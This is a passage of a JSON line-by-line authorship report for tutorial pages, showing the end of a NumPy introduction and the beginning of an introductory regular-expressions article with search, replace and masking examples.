        "content": "NumPy is built around its `array` type (an alias for `ndarray`, hinting at its multidimensional nature). Unlike Python"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "lists, elements of `array` instances are stored in memory contiguously, reducing interpreter overhead"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "and enabling parallel operations."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "An `array` object can be initialised from iterables or nested lists through `np.array` (assuming NumPy has been"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "imported as `np`, as is usually done in production code, and which will be assumed in the rest of this article):"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "a \u003d np.array([7, 3, 9, 3, 1, 3, 3, 7]) # 1D array"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "b \u003d np.array([[8, 1, 6], [3, 5, 7], [4, 9, 2]]) # 2D array"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "By default, these arrays are indexed in C order (last index changes fastest), as can be illustrated by"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "invoking the `reshape` array method:"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e np.array(range(27)).reshape((3,3,3))"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "array([[[ 0,  1,  2],"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "        [ 3,  4,  5],"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "        [ 6,  7,  8]],"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "       [[ 9, 10, 11],"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "        [12, 13, 14],"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "        [15, 16, 17]],"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "       [[18, 19, 20],"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "        [21, 22, 23],"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "        [24, 25, 26]]])"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Otherwise, indexing is mostly as in standard Python, with the convenience that extra square brackets can be"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "omitted for multi-_axis_ (array coordinate) indexing, so `a[0][1:][2]` becomes `a[0,1:,2]`."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "See [this page](https://numpy.org/devdocs/reference/arrays.indexing.html) for a more detailed explanation."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "### Library Functions"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to its array type, NumPy provides a large [library](https://numpy.org/devdocs/reference/routines.html)"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "for manipulating arrays. These include:"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "* [creating special types of arrays](https://numpy.org/devdocs/reference/routines.array-creation.html)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "* [sorting and searching](https://numpy.org/devdocs/reference/routines.sort.html)"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "* [random number generation](https://numpy.org/devdocs/reference/random/index.html)"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "* [linear algebra](https://numpy.org/devdocs/reference/routines.linalg.html)"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "* [other mathematical functions](https://numpy.org/devdocs/reference/routines.math.html)"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "```python"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "# Example: solve a system of linear equations with NumPy"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e A \u003d np.array([[9, -9, -10], [8, 5, -4], [0, 7, -9]])"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e b \u003d np.array([-3, 5, -7])"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e\u003e\u003e np.linalg.solve(A, b)"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "array([0.95958854, 0.22997796, 0.95664952])"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "Many of these functions work equally well on one-dimensional arrays as they do on 11-dimensional ones due to the"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "compiled binaries. Many can take in standard Python nested lists, automatically converting them to NumPy\u0027s"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "array type before proceeding. Some functions also accept extra arguments that refine the parts of arrays they work on"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "or the values they return, allowing finer control beyond indexing and slicing. The `axis` argument in `np.mean`"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "[above](#numpys-benefits-and-drawbacks) is an example."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "For even faster programs, it is possible to interact with external C libraries through NumPy\u0027s"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "[application programming interface](https://numpy.org/devdocs/reference/c-api/index.html), but this is not needed"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "for general use. The primary reason for exposing such a functionality is the continuing widespread use of C libraries"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "in mathematics and physics."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "## Tutorials and Resources"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "Where can you get started with learning NumPy, then? The [NumPy User Guide](https://numpy.org/devdocs/user/index.html)"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "contains several tutorials for programmers of all abilities, including the following:"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "* [NumPy: the absolute basics for beginners](https://numpy.org/devdocs/user/absolute_beginners.html) introduces the"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "array type."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "* [NumPy basics](https://numpy.org/devdocs/user/basics.html) goes into slightly more advanced topics, such as"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "broadcasting (the mechanism for interpreting operations between differently sized arrays, or between arrays"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "and scalars)."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "* The [quickstart](https://numpy.org/devdocs/user/quickstart.html) encompasses both the above tutorials, fits on"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "one page and also has handy links to commonly used functions. "
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "* A tutorial on doing [some linear algebra with NumPy](https://numpy.org/devdocs/user/tutorial-svd.html)."
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "* [A cheat sheet](https://numpy.org/devdocs/user/numpy-for-matlab-users.html) for programmers coming from MATLAB,"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "another array-based programming language."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "----"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "In practice, NumPy is not often used alone, but rather as part of what NumPy\u0027s documentation calls a _scientific"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "Python distribution_, which also includes several NumPy dependents. The most widely used such distribution is"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "[Anaconda](https://www.anaconda.com/distribution)."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "Some of these dependents are listed below, with links to tutorials that themselves use NumPy to drive their high-level"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "routines. Reading them may illuminate your journey in understanding and the underlying array language."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "* [matplotlib](https://matplotlib.org/tutorials/index.html): produces plots of all kinds. Input to the plotting"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "functions is typically in the form of NumPy arrays."
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "* [SciPy](https://docs.scipy.org/doc/scipy/reference/tutorial/general.html): essentially a more elaborated NumPy"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "with computationally intensive routines for tasks such as optimisation and image processing."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "* [scikit-learn](https://scikit-learn.org/stable/tutorial/basic/tutorial.html): like SciPy, but for machine learning."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "* [pandas](https://pandas.pydata.org/docs/getting_started/10min.html): uses NumPy in its `DataFrame` object."
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "* [Numba](https://numba.pydata.org/numba-doc/latest/user/5minguide.html): heavily relies on the contingency offered"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "by NumPy objects to enable massively parallel computation."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "iskandarzulkarnaien": 2,
      "-": 196
    }
  },
  {
    "path": "contents/regex/Regex.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Regular Expressions"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Regular Expressions"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: Jamos Tay"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview‎](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [What are Regular Expressions?‎](#what-are-regular-expressions)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Why should I learn Regex?‎](#why-should-i-learn-regex)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting Started‎](#getting-started)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Introduction‎](#introduction)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Search Text‎](#search-text)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Example‎](#example)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Search and Replace‎](#search-and-replace)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Result‎](#result)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Capturing groups‎](#capturing-groups)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Result‎](#result)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Further exploration‎](#further-exploration)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Quick Reference‎](#quick-reference)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Helpful links‎](#helpful-links)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Advanced topics‎](#advanced-topics)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [The Regex Engine‎](#the-regex-engine)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Greedy Operators‎](#greedy-operators)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Effect on performance‎](#effect-on-performance)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Catastrophic Backtracking‎](#catastrophic-backtracking)"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Matching Delimiters‎](#matching-delimiters)"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Related links‎](#related-links)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Learning resources‎](#learning-resources)"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Fun Stuff‎](#fun-stuff)"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Further Reading‎](#further-reading)"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "# Overview"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "## What are Regular Expressions?"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "A Regular Expression (or Regex for short) is a string of characters that define a search pattern. You can think of a regular expression as a list of descriptions that describe a string. These strings can be tested against other text formatted data to find, match, and extract data."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "Imagine you\u0027re a witness of a robbery. How might you describe the robber to the police? You might say that the robber has a beard, brown hair and a facial scar. With this information, the police can round up everyone with beards, brown hair and scars as possible suspects. This is similar to how Regex works. You specify a search pattern using a string (e.g. It starts with `C`, ends with a `S`, and only consists of letters: `C[A-z]+S`) and the section of text is searched, finding all the possible matches."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Should I Learn Regex?"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* **Regex is everywhere** - Regular Expressions are technically a language by themselves, but they are usually implemented within other languages. Almost all commonly used languages, like Java, C++ or Python supports Regex is some fashion (A full list is available [here](https://www.regular-expressions.info/tools.html)). In addition, many IDEs or text editors support Regex in \u0027Find and replace\u0027 operations, such as Eclipse, Visual Studio or Notepad++, allowing non-programmers to benefit from Regex."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "* **Regex is portable** - People often complain that switching to a new language usually means having to learn a new API and syntax. Regex however is implemented almost the same way on every single language, so you can just learn it once and use it everywhere."
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "* **Regex is useful** - Although Regex doesn\u0027t have a specific use, it is a general use library with many different applications. It can be used automate many different common programming tasks such as validating user input, parsing data from text, and string manipulation, all of which are commonly done in any programming project."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "* **Regex is convenient** - \"Regex offers a simple and painless way of dealing some with them\" because not all string processing are regex-related."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "# Getting Started"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "## Introduction"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "The power of regex revolves around the idea that most data comes in a regular, predictable format. Some everyday examples are as follows:"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "* Phone numbers: +65 65162727"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "* Passwords: Contains lower/upper case, symbol…"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "* IP Addresses: 127.0.0.1:8080"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "* Date time: DD/MM/YY HH:MM"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "Regex exploits these simlarities and provides a way of specifying patterns that can fit almost any use case. Some of the basic functionalities are as follows:"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s take a look at some simple examples without code. For this article, you can use any text editor that supports Regex functionality (e.g. [Notepad++](https://notepad-plus-plus.org/download/v7.3.1.html), [Sublimetext](https://www.sublimetext.com/))."
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "## Search Text"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "The most basic use of Regex is searching a section of text. Say you want to find all occurences of a word in a text. Simple, right? Just use the search function. However, what if you aren\u0027t looking for a specific string? For example, if you\u0027re looking for phone numbers (represented simply as an 8 digit number) in a chat log, you don\u0027t want a specific 8 digit number, you want to find all possible 8 digit numbers. This can\u0027t be done with your traditional Ctrl-F search."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Rather, what you\u0027re looking for is a **pattern** - a string that satisfies certain properties. Regex allows you to specify these properties using a pattern string, also known as the titular **Regular Expression**. These patterns encapsulate properties about the string you\u0027re looking for."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "### Example"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s go back to our example of finding phone numbers in a text. You know that a string representing a phone number must satisfy two criteria: It consists of 8 digits, and may have a country code `65` in front of it. This is what the equivalent pattern for such a string might look like:"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "`(65)?[\\d]{8}`"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "Firstly, the phone number may start with a country code 65. This criterion is embedded in `(65)?`. The first part, `(65)`, matches the country code. The question mark `?` means that the `(65)` that comes before it is optional."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "Secondly, a phone number must have 8 digits. This is specified by `[\\d]{8}`. `[\\d]` matches a single digit from 0-9, and `{8}` means that `[\\d]` is repeated 8 times. Putting them together, `[\\d]{8}` matches a string of 8 digits."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "As we can see, the pattern `(65)?[\\d]{8}` when translated to simple English, means \u0027Look for a string of 8 numerical digits, that may have an extra `65` in front of it\u0027. This satisfies our criteria for matching a phone number, so we can use it to search our text. Here are some examples of matching strings:"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "6591234567"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "87775555"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "67777188"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "## Search and Replace"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "Note: If you\u0027re using one of the recommended text editors to search and replace, please ensure that the search mode is set to \u0027Regular Expression\u0027. This is usually an option in the \u0027Find and Replace\u0027 (i.e. Ctrl+F) window."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "Regex can also be used to search and replace strings."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "Say you have a passage of text which contains NRICs to be censored."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * John - S1234567A"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * Mary - S8192853B"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * David - S1235326C"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "This can\u0027t be done with a simple search and replace, since NRICs have different digits, and we can\u0027t specify which ones to look for. However, we know that an NRIC consists of an S, 7 digits from 0-9 and ends with a letter. Knowing this we can construct a Regex:"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "* Find: `S[\\d]{7}[A-Z]`"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "* Replace: `SXXXXXXXX`"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "As we can see, the `S` matches the very first S, [\\d]{7} matches a string of 7 digits, and [A-Z] matches a single capital letter. We then replace all the critical information with a string of Xs."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "### Result"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * John - SXXXXXXXX"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * Mary - SXXXXXXXX"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * David - SXXXXXXXX"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Capturing Groups"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "Now, imagine you have a section of text with many dates written in the US Date Format (MM-DD-YYYY)."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Calendar"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 02-20-2017 Paul\u0027s Birthday"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 02-24-2017 Presentation at work"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e * 02-25-2017 Workshop"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
